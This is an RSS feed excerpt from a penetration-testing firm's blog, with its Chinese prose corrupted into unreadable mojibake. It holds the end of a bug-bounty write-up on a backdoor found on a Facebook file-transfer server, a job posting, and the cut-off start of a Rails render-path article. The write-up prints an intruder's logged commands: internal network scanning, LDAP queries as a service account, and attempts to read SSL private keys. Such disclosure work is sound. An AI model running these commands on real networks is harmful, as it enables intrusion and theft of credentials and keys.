&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;(seq 0 1 255); do echo &amp;quot;192.168.&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;j:`dig +short ptr &lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;j.&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;i.168.192.in-addr.arpa`&amp;quot;; done; done&amp;#39; 2&amp;gt;/dev/stdout
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ä½¿ç”¨ Shell Script é€²è¡Œå…§ç¶²æƒæä½†å¿˜è¨˜æŠŠ STDERR å°æ‰XD&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/6.jpg&quot; alt=&quot;Port Scanning&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å˜—è©¦å°å…§éƒ¨ LDAP é€²è¡Œé€£æ¥&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;sh: -c: line 0: syntax error near unexpected token `(&amp;#39;
sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w &amp;#39;********&amp;#39; -s base (objectclass=*) 2&amp;gt;/dev/stdout&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å˜—è©¦è¨ªå•å…§éƒ¨ç¶²è·¯è³‡æº  &lt;br /&gt;
( çœ‹èµ·ä¾† Mail OWA å¯ä»¥ç›´æ¥è¨ªå• â€¦)&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;--20:38:09--  https://mail.thefacebook.com/
Resolving mail.thefacebook.com... 192.168.52.37
Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://mail.thefacebook.com/owa/ [following]
--20:38:10--  https://mail.thefacebook.com/owa/
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0 [following]
--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 200 OK
Length: 8902 (8.7K) [text/html]
Saving to: `STDOUT&amp;#39;

     0K ........                                              100% 1.17G=0s

20:38:10 (1.17 GB/s) - `-&amp;#39; saved [8902/8902]

--20:38:33--  (try:15)  https://10.8.151.47/
Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
Resolving svn.thefacebook.com... failed: Name or service not known.
--20:39:03--  https://sb-dev.thefacebook.com/
Resolving sb-dev.thefacebook.com... failed: Name or service not known.
failed: Connection timed out.
Retrying.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å˜—è©¦å° SSL Private Key ä¸‹æ‰‹&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å¾ç€è¦½å™¨è§€å¯Ÿ files.fb.com çš„æ†‘è­‰é‚„æ˜¯ Wildcard çš„ *.fb.com â€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/7.jpg&quot; alt=&quot;certificate of files.fb.com&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;å¾Œè¨˜&quot;&gt;å¾Œè¨˜&lt;/h3&gt;

&lt;p&gt;åœ¨æ”¶é›†å®Œè¶³å¤ è­‰æ“šå¾Œä¾¿ç«‹å³å›å ±çµ¦ Facebook å®‰å…¨åœ˜éšŠï¼Œå›å ±å…§å®¹é™¤äº†æ¼æ´ç´°ç¯€å¤–ï¼Œé‚„é™„ä¸Šç›¸å°æ‡‰çš„ Log ã€æˆªåœ–ä»¥åŠæ™‚é–“ç´€éŒ„xD&lt;/p&gt;

&lt;p&gt;å¾ä¼ºæœå™¨ä¸­çš„æ—¥èªŒå¯ä»¥ç™¼ç¾æœ‰å…©å€‹æ™‚é–“é»æ˜¯æ˜é¡¯é§­å®¢åœ¨æ“ä½œç³»çµ±çš„æ™‚é–“ï¼Œä¸€å€‹æ˜¯ä¸ƒæœˆåˆã€å¦å€‹æ˜¯ä¹æœˆä¸­æ—¬&lt;/p&gt;

&lt;p&gt;ä¸ƒæœˆåˆçš„å‹•ä½œå¾ç´€éŒ„ä¸­ä¾†çœ‹èµ·ä¾†æ¯”è¼ƒåå‘ â€œé€›â€ ä¼ºæœå™¨ï¼Œä½†ä¹æœˆä¸­æ—¬çš„æ“ä½œå°±æ¯”è¼ƒæƒ¡æ„äº†ï¼Œé™¤äº†é€›è¡—å¤–ï¼Œé‚„æ”¾ç½®äº†å¯†ç¢¼ Logger ç­‰ï¼Œè‡³æ–¼å…©å€‹æ™‚é–“é»çš„ â€œé§­å®¢â€ æ˜¯ä¸æ˜¯åŒä¸€å€‹äººå°±ä¸å¾—è€ŒçŸ¥äº† :P  &lt;br /&gt;
è€Œä¸ƒæœˆç™¼ç”Ÿçš„æ™‚æ©Ÿé»æ­£å¥½æ¥è¿‘ CVE-2015-2857 Exploit å…¬ä½ˆå‰ï¼Œç©¶ç«Ÿæ˜¯é€é 1-Day é‚„æ˜¯ç„¡ 0-Day å…¥ä¾µç³»çµ±ä¹Ÿç„¡å¾å¾—çŸ¥äº†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;é€™ä»¶äº‹æƒ…å°±è¨˜éŒ„åˆ°é€™è£¡ï¼Œç¸½é«”ä¾†èªªé€™æ˜¯ä¸€å€‹éå¸¸æœ‰è¶£çš„ç¶“æ­·xD  &lt;br /&gt;
ä¹Ÿè®“æˆ‘æœ‰é€™å€‹æ©Ÿæœƒå¯ä»¥ä¾†å¯«å¯«é—œæ–¼æ»²é€çš„ä¸€äº›æ–‡ç«  :P&lt;/p&gt;

&lt;p&gt;æœ€å¾Œä¹Ÿæ„Ÿè¬ Bug Bounty åŠèƒ¸è¥Ÿå¯¬é—Šçš„ Facebook å®‰å…¨åœ˜éšŠ è®“æˆ‘å¯ä»¥å®Œæ•´è¨˜éŒ„é€™èµ·äº‹ä»¶ : )&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/05 20:05 æä¾›æ¼æ´è©³æƒ…çµ¦ Facebook å®‰å…¨åœ˜éšŠ&lt;/li&gt;
  &lt;li&gt;2016/02/05 20:08 æ”¶åˆ°æ©Ÿå™¨äººè‡ªå‹•å›è¦†&lt;/li&gt;
  &lt;li&gt;2016/02/06 05:21 æä¾›å¼±é» Advisory çµ¦ Accellion æŠ€è¡“çª—å£&lt;/li&gt;
  &lt;li&gt;2016/02/06 07:42 æ”¶åˆ° Thomas çš„å›è¦†ï¼Œå‘ŠçŸ¥èª¿æŸ¥ä¸­&lt;/li&gt;
  &lt;li&gt;2016/02/13 07:43 æ”¶åˆ° Reginaldo çš„å›è¦†ï¼Œå‘ŠçŸ¥ Bug Bounty çé‡‘ $10000 USD&lt;/li&gt;
  &lt;li&gt;2016/02/13 è©¢å•æ˜¯å¦æ’°å¯« Blog æ˜¯å¦æœ‰ä»»ä½•è¦æ³¨æ„çš„åœ°æ–¹?&lt;/li&gt;
  &lt;li&gt;2016/02/13 è©¢å•æ­¤æ¼æ´è¢«èªç‚ºæ˜¯ RCE é‚„æ˜¯ SQL Injection&lt;/li&gt;
  &lt;li&gt;2016/02/18 æ”¶åˆ° Reginaldo çš„å›è¦†ï¼Œå‘ŠçŸ¥æ­£åœ¨é€²è¡Œèª¿æŸ¥ä¸­ï¼Œå¸Œæœ› Blog å…ˆæš«æ™‚ä¸è¦ç™¼å‡º&lt;/li&gt;
  &lt;li&gt;2016/02/24 æ”¶åˆ° Hai çš„å›è¦†ï¼Œå‘ŠçŸ¥çé‡‘å°‡æœƒæ–¼ä¸‰æœˆç™¼é€&lt;/li&gt;
  &lt;li&gt;2016/04/20 æ”¶åˆ° Reginaldo çš„å›è¦†ï¼Œå‘ŠçŸ¥èª¿æŸ¥å·²å®Œæˆ&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/</link>
                <guid>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script</guid>
                <pubDate>Thu, 21 Apr 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[å·²çµæŸ] DEVCORE å¾µæ±‚è¡Œæ”¿å‡ºç´äººæ‰</title>
                <description>&lt;p&gt;ï¼ˆ2015.9.16 å·²çµæŸå¾µæ‰ï¼‰&lt;/p&gt;

&lt;p&gt;æˆ´å¤«å¯‡çˆ¾å³å°‡è¦é‚å…¥ç¬¬å››å€‹å¹´é ­ï¼Œåœ¨éå»çš„æ­²æœˆä¸­ï¼Œæˆ‘å€‘æ¨å»£è³‡å®‰çš„é‡è¦æ€§ã€å¼·èª¿å®‰å…¨é–‹ç™¼ã€‚æˆ‘å€‘å …æŒæä¾›æœ€é«˜å“è³ªçš„æ»²é€æ¸¬è©¦æœå‹™ï¼Œå”åŠ©ä¼æ¥­æ‰¾å‡ºéš±è—çš„è³‡å®‰å¨è„…ã€‚æˆ‘å€‘ä¹Ÿä¸æ–·ç²¾é€²æŠ€è¡“ï¼ŒæœŸè¨±è‡ªå·±èƒ½æˆç‚ºå…¨å°ç£ç¬¬ä¸€çš„æ»²é€æ¸¬è©¦åœ˜éšŠã€‚&lt;/p&gt;

&lt;p&gt;æ„Ÿè¬é€™äº›å¹´ä¾†æ¥­ç•Œæœ‹å‹å°æˆ‘å€‘çš„è‚¯å®šèˆ‡æ”¯æŒï¼Œæˆ´å¤«å¯‡çˆ¾å¾—ä»¥èŒå£¯ï¼Œå¦‚ä»Šï¼Œæˆ‘å€‘é‚„éœ€è¦ä¸€ä½è¡Œæ”¿å‡ºç´äººæ‰ï¼Œæˆ‘å€‘æ¸´æœ›æ‚¨çš„åŠ å…¥ï¼Œåšç‚ºæˆ´å¤«å¯‡çˆ¾ç©©å®šçš„åŠ›é‡ã€‚ç›¸é—œç´°ç¯€å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å·¥ä½œå…§å®¹&quot;&gt;å·¥ä½œå…§å®¹&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;å”åŠ©è™•ç†åº¶å‹™æ€§è¡Œæ”¿å·¥ä½œï¼ˆæ¥è½ä¾†é›»ã€æ”¶ç™¼ã€æ¥å¾…ï¼‰&lt;/li&gt;
  &lt;li&gt;è² è²¬åˆç´„ç®¡ç†ã€å‡ºç¼ºè€ƒå‹¤ç®¡ç†ã€å¸³å‹™æ˜ç´°æ•´ç†&lt;/li&gt;
  &lt;li&gt;è¦åŠƒã€åŸ·è¡Œæ¡è³¼åº¶å‹™&lt;/li&gt;
  &lt;li&gt;æ‡‰æ”¶æ‡‰ä»˜æ¬¾é …èˆ‡é›¶ç”¨é‡‘ç®¡ç†&lt;/li&gt;
  &lt;li&gt;éŠ€è¡Œå¾€ä¾†èˆ‡ä¸€èˆ¬æ¬¾é …æ”¶ä»˜ä½œæ¥­&lt;/li&gt;
  &lt;li&gt;å”åŠ©ä¸»ç®¡åŸ·è¡Œç›¸é—œæ¥­å‹™&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å·¥ä½œæ™‚é–“&quot;&gt;å·¥ä½œæ™‚é–“&lt;/h3&gt;
&lt;p&gt;10:00 - 18:00&lt;/p&gt;

&lt;h3 id=&quot;å·¥ä½œåœ°é»&quot;&gt;å·¥ä½œåœ°é»&lt;/h3&gt;
&lt;p&gt;å°åŒ—å¸‚ä¸­å±±å€å¾©èˆˆåŒ—è·¯ 168 è™Ÿ 10 æ¨“&lt;br /&gt;&lt;br /&gt;
ï¼ˆæ·é‹å—äº¬å¾©èˆˆç«™ï¼Œèµ°è·¯ç´„ä¸‰åˆ†é˜ï¼‰&lt;/p&gt;

&lt;h3 id=&quot;æ¢ä»¶è¦æ±‚&quot;&gt;æ¢ä»¶è¦æ±‚&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;éœ€æœ‰å…©å¹´ä»¥ä¸Šç›¸é—œå·¥ä½œç¶“é©—&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰è©¦ç®—è¡¨ï¼Œå…·ç¨ç«‹æ’°å¯«è©¦ç®—è¡¨å…¬å¼èƒ½åŠ›&lt;/li&gt;
  &lt;li&gt;ç¿’æ…£ä½¿ç”¨é›²ç«¯æœå‹™ï¼Œå¦‚ï¼šGoogle Drive, Dropbox æˆ–å…¶ä»–&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;åŠ åˆ†æ¢ä»¶&quot;&gt;åŠ åˆ†æ¢ä»¶&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;æ‚¨ä½¿ç”¨éå°ˆæ¡ˆç®¡ç†ç³»çµ±ï¼Œå¦‚ï¼šTrello, Basecamp, Redmine æˆ–å…¶ä»–&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;æ‚¨å°‡æœƒä½¿ç”¨å°ˆæ¡ˆç®¡ç†ç³»çµ±ç®¡ç†å¹³æ—¥ä»»å‹™&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;æ‚¨æ˜¯ MAC ä½¿ç”¨è€…&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;æ‚¨æœªä¾†çš„é›»è…¦æœƒæ˜¯ MACï¼Œæˆ‘å€‘å¸Œæœ›æ‚¨è¶Šå¿«é †æš¢ä½¿ç”¨é›»è…¦è¶Šå¥½&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;æ‚¨æ›¾ç¶“åšéè¡Œæ”¿ç›¸é—œè·å‹™ï¼Œä½†å°è¡Œæ”¿ä¸€è·æœ‰ä¸€å¥—è‡ªå·±çš„æƒ³æ³•&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;æˆ‘å€‘æ˜¯æ–°å‰µå…¬å¸ï¼Œæˆ‘å€‘æ­¡è¿æ‚¨æŒ‘æˆ°æ—¢å®šçš„è¡Œæ”¿åˆ»ç‰ˆå°è±¡&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;æ‚¨æ˜¯ç”Ÿæ´»é§­å®¢&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;æ‚¨ä¸éœ€è¦æœƒå¯«ç¨‹å¼ï¼Œä½†æ‚¨ç¿’æ…£è§€å¯Ÿç”Ÿæ´»ä¸­çš„è¦å¾‹ï¼Œä¸¦æƒ³è¾¦æ³•åˆ©ç”¨é€™äº›è¦å¾‹æœ‰æ•ˆç‡çš„è§£æ±ºå•é¡Œ&lt;/font&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å·¥ä½œç’°å¢ƒ&quot;&gt;å·¥ä½œç’°å¢ƒ&lt;/h3&gt;
&lt;p&gt;æˆ‘å€‘æ³¨é‡å…¬å¸æ¯å€‹äººçš„èº«å¿ƒå¥åº·ï¼Œæ‰€ä»¥ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æ‚¨æœƒåœ¨ä¸€å€‹é–‹é—Šçš„è¾¦å…¬ç’°å¢ƒå·¥ä½œ&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_2.jpg&quot; alt=&quot;DEVCORE ENV&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;æ‚¨æœƒæ“æœ‰ä¸€å¼µ Aeron äººé«”å·¥å­¸æ¤…&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_aeron.jpg&quot; alt=&quot;DEVCORE AERON&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;æ¯é€±è£œæ»¿é£²æ–™ï¼ˆå¦æœ‰å’–å•¡æ©Ÿï¼‰ã€é›¶é£Ÿï¼Œè®“æ‚¨ä¿æŒå¿ƒæƒ…æ„‰å¿«&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_3.jpg&quot; alt=&quot;DEVCORE DRINK&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;å…¬å¸æä¾›é£›é¢æ©Ÿè®“æ‚¨ç™¼æ´©å°ä¸»ç®¡çš„æ€¨æ°£&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_dart.jpg&quot; alt=&quot;DEVCORE DART&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å“¡å·¥ç¦åˆ©&quot;&gt;å“¡å·¥ç¦åˆ©&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ç¬¬ä¸€å¹´å³æœ‰ç‰¹ä¼‘ï¼ˆç…§æ¯”ä¾‹ï¼‰ï¼Œæ¯å¹´åº¦äº”å¤©å…¨è–ªç—…å‡&lt;/li&gt;
  &lt;li&gt;ä¸‰ç¯€ã€ç”Ÿæ—¥ç¦®é‡‘&lt;/li&gt;
  &lt;li&gt;æ¯å­£å“¡å·¥èšé¤&lt;/li&gt;
  &lt;li&gt;æ¯å¹´å“¡å·¥æ—…éŠ&lt;/li&gt;
  &lt;li&gt;æ¯å¹´å“¡å·¥å¥æª¢&lt;/li&gt;
  &lt;li&gt;å‹ä¿ã€å¥ä¿ã€å‹é€€ã€åœ˜ä¿&lt;/li&gt;
  &lt;li&gt;å®šæœŸå°ˆäººæŒ‰æ‘©æœå‹™&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è–ªè³‡å¾…é‡&quot;&gt;è–ªè³‡å¾…é‡&lt;/h3&gt;
&lt;p&gt;æ–°å°å¹£ 32,000 - 40,000 ï¼ˆä¿è­‰ 14 å€‹æœˆï¼‰&lt;/p&gt;

&lt;h3 id=&quot;æ‡‰å¾µæ–¹å¼&quot;&gt;æ‡‰å¾µæ–¹å¼&lt;/h3&gt;
&lt;p&gt;è«‹ä¾†ä¿¡å°‡æ‚¨çš„å±¥æ­·ä»¥ PDF æ ¼å¼å¯„åˆ° recruiting@devco.reï¼Œæ¨™é¡Œæ ¼å¼å¦‚ä¸‹ï¼š&lt;br /&gt;&lt;strong&gt;[æ‡‰å¾µ] è¡Œæ”¿å‡ºç´å°ˆå“¡ (æ‚¨çš„å§“å)&lt;/strong&gt;&lt;br /&gt;&lt;br /&gt;æˆ‘å€‘æœƒåœ¨å…©é€±å…§ä¸»å‹•èˆ‡æ‚¨è¯ç¹«ã€‚å¯©æŸ¥æ–¹å¼æœƒæœ‰æ›¸å¯©ã€ç·šä¸Šæ¸¬é©—ä»¥åŠé¢è©¦ä¸‰å€‹éšæ®µã€‚æœ€å¿«å°‡æ–¼ä¹æœˆåˆé–‹å§‹é€²è¡Œç¬¬äºŒéšæ®µæ¸¬è©¦ï¼Œç…©è«‹è€å¿ƒç­‰å€™ã€‚&lt;br /&gt;å±¥æ­·è«‹æ§åˆ¶åœ¨å…©é ä»¥å…§ï¼Œéœ€åŒ…å«ä»¥ä¸‹å…§å®¹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;åŸºæœ¬è³‡æ–™&lt;/li&gt;
  &lt;li&gt;å­¸æ­·&lt;/li&gt;
  &lt;li&gt;å·¥ä½œç¶“æ­·&lt;/li&gt;
  &lt;li&gt;ç¤¾ç¾¤æ´»å‹•ç¶“é©—&lt;/li&gt;
  &lt;li&gt;ç‰¹æ®Šäº‹è¹Ÿ&lt;/li&gt;
  &lt;li&gt;MBTI è·æ¥­æ€§æ ¼æ¸¬è©¦çµæœï¼ˆè«‹è‡ªè¡Œå°‹æ‰¾ç·šä¸Šæ¸¬é©—æ¸¬è©¦ï¼‰&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è«‹åƒè€ƒç¯„ä¾‹ç¤ºæ„ï¼ˆ&lt;a href=&quot;http://devco.re/assets/files/recruit2015/Resume_Example.doc&quot;&gt;DOC&lt;/a&gt;ã€&lt;a href=&quot;http://devco.re/assets/files/recruit2015/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;ã€&lt;a href=&quot;http://devco.re/assets/files/recruit2015/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;ï¼‰ä¸¦è½‰æˆ PDFã€‚&lt;br /&gt;&lt;br /&gt;
è‹¥æ‚¨æœ‰è‡ªä¿¡ï¼Œä¹Ÿå¯ä»¥è‡ªç”±ç™¼æ®æœ€èƒ½å‘ˆç¾æ‚¨èƒ½åŠ›çš„å±¥æ­·ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é™„è¨»&quot;&gt;é™„è¨»&lt;/h3&gt;
&lt;p&gt;ç”±æ–¼æœ€è¿‘æ¥­å‹™è¼ƒç‚ºå¿™ç¢Œï¼Œè‹¥æœ‰æ‡‰å¾µç›¸é—œå•é¡Œï¼Œè«‹ä¸€å¾‹ä½¿ç”¨ Email è¯ç¹«ï¼Œé€ æˆæ‚¨çš„ä¸ä¾¿è«‹è¦‹è«’ã€‚&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;æˆ‘å€‘é¸æ“‡å„ªå…ˆåœ¨éƒ¨è½æ ¼å…¬å¸ƒå¾µæ‰è³‡è¨Šï¼Œæ˜¯å¸Œæœ›æ‚¨ä¹Ÿå°å®‰å…¨è­°é¡Œæ„Ÿèˆˆè¶£ï¼Œå³ä½¿ä¸æ‡‚æŠ€è¡“ä¹Ÿæƒ³ç‚ºå°ç£è³‡å®‰ç›¡ä¸€é»åŠ›ã€‚å¦‚æœæ‚¨é™¤äº†è™•ç†åŸºæœ¬äº‹å‹™å¤–é‚„æœ‰æ›´å¤šæƒ³æ³•ï¼Œä¹Ÿæ­¡è¿èˆ‡æˆ‘å€‘è¯ç¹«ï¼Œæˆ‘å€‘æœƒä¿ç•™çµ¦æ‚¨ç™¼æ®çš„ç©ºé–“èˆ‡èª¿å‡è–ªæ°´ã€‚&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
ç„¡è«–å¦‚ä½•ï¼Œæˆ‘å€‘éƒ½æ„Ÿè¬æ‚¨çš„ä¾†ä¿¡ï¼ŒæœŸå¾…æ‚¨çš„åŠ å…¥ï¼&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2015/08/19/devcore-2015-recruit/</link>
                <guid>https://devco.re/blog/2015/08/19/devcore-2015-recruit</guid>
                <pubDate>Wed, 19 Aug 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Rails å‹•æ…‹æ¨£æ¿è·¯å¾‘çš„é¢¨éšª</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;å¾å®‰å…¨é–‹ç™¼çš„è§’åº¦ä¾†çœ‹ï¼ŒRuby on Rails æ˜¯ä¸€å¥—å¾ˆå‹å–„çš„æ¡†æ¶ã€‚å®ƒå¾æ¡†æ¶å±¤é¿å…äº†å¾ˆå¤šéå»ç¶²ç«™å¸¸å‡ºç¾çš„å®‰å…¨å•é¡Œï¼Œä¾‹å¦‚ä½¿ç”¨ ORM é¿å…å¤§éƒ¨åˆ†çš„ SQL injection å•é¡Œã€æœ‰å…§å»ºçš„ authenticity_token è®“é–‹ç™¼è€…ä¸å¿…ç‰¹åˆ¥ç…©æƒ± CSRFã€å¾æ©Ÿåˆ¶é¢è¦å®šé–‹ç™¼è€…ä½¿ç”¨ Strong Parameter é¿å… Mass Assignmentã€é è¨­è½‰åŒ–å±éšªå­—å…ƒé¿å… XSS ç­‰â€¦ã€‚&lt;/p&gt;

&lt;p&gt;å°±æˆ‘å€‘éå»&lt;a href=&quot;https://devco.re/services/penetration-test&quot; title=&quot;æ»²é€æ¸¬è©¦&quot;&gt;æ»²é€æ¸¬è©¦&lt;/a&gt;çš„ç¶“é©—ä¾†èªªï¼ŒRails ç¶²ç«™é›–ç„¶é‚„æ˜¯èƒ½æ‰¾åˆ°å•é¡Œï¼Œä½†ç›¸å°å•é¡Œè¼ƒå°‘ï¼Œè€Œä¸”å¾ˆå°‘å–®ç´”å› ç‚º Rails å¯«æ³•å•é¡Œæ‹¿åˆ°ç³»çµ±æ“ä½œæ¬Šã€‚è€Œä»Šå¤©è¦åˆ†äº«çš„ï¼Œæ˜¯åœ¨ä¸€æ¬¡æ»²é€æ¸¬è©¦ä¸­æ¯”è¼ƒç‰¹åˆ¥çš„ä¾‹å­ï¼Œå› ç‚ºé–‹ç™¼è€…ä½¿ç”¨äº†å‹•æ…‹æ¨£æ¿è·¯å¾‘(Dynamic Render Paths)çš„å¯«æ³•&lt;sup id=&quot;fnref:note1&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;ï¼Œæœ€å¾Œé€ æˆäº†åš´é‡çš„çµæœã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;å‹•æ…‹æ¨£æ¿è·¯å¾‘ï¼ŒOWASP çš„&lt;a href=&quot;https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet#Dynamic_Render_Paths&quot;&gt;ä»‹ç´¹&lt;/a&gt;æ˜¯é€™æ¨£çš„ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;In Rails, controller actions and views can dynamically determine which view or partial to render by calling the â€œrenderâ€ method. If user input is used in or for the template name, an attacker could cause the application to render an arbitrary view, such as an administrative page.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
Care should be taken when using user input to determine which view to render. If possible, avoid any user input in the name or path to the view.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;OWASP æ˜¯èªªï¼Œå¦‚æœä½ çš„æ¨£æ¿è·¯å¾‘æ˜¯å‹•æ…‹ç”¢ç”Ÿçš„ï¼Œè€Œä¸”ä½¿ç”¨è€…å¯ä»¥æ§åˆ¶é‚£å€‹æ¨£æ¿è·¯å¾‘ï¼Œé‚£éº¼ä½¿ç”¨è€…å°±å¯ä»¥è®€å–åˆ°ä»»æ„æ¨£æ¿ï¼ŒåŒ…å«ç®¡ç†ä»‹é¢çš„æ¨£æ¿ã€‚é€™æ¨£çš„æè¿°æ„Ÿè¦ºé‚„å¥½ï¼Œä½†å°±æˆ‘å€‘çš„ç™¼ç¾ï¼Œé€™å…¶å¯¦æ˜¯æ›´åš´é‡çš„ç›´æ¥å­˜å–ç‰©ä»¶å•é¡Œ(Insecure Direct Object References)ï¼Œç”šè‡³æœ‰æ©Ÿæœƒé€ æˆé ç«¯å‘½ä»¤åŸ·è¡Œ(Remote Code Execution)ï¼Œæ€éº¼èªªå‘¢ï¼Ÿæˆ‘å€‘ç›´æ¥çœ‹ä¸‹å»ã€‚&lt;/p&gt;

&lt;h3 id=&quot;åŸºæœ¬ç´°ç¯€&quot;&gt;åŸºæœ¬ç´°ç¯€&lt;/h3&gt;

&lt;p&gt;ä¸€å€‹å‹•æ…‹æ¨£æ¿è·¯å¾‘çš„å¯«æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# app/controllers/welcome_controller.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;WelcomeController&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ApplicationController&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;index&lt;/span&gt;
